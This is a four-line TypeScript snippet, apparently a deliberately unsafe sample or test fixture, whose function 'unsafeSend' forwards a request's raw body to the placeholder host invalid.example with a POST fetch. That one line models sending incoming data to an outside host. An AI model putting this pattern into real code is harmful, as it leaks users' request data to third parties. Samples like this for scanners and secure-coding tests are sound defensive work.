async function unsafeSend(req: { body: string }) {
  const raw = req.body;
  await fetch("https://invalid.example", { method: "POST", body: raw });
}
